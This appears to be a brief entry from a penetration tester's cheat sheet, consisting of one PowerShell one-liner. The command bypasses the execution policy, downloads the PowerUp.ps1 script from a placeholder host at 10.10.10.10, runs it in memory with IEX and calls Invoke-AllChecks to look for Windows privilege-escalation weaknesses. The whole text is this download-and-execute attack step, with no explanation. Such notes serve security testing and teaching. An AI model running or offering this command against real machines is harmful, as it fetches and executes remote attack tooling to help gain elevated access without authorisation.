Powershell

Powerup Download and Invoke All Checks:

~~~PowerShell
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Windows/Powershell/PowerUp.ps1'); Invoke-AllChecks”
~~~

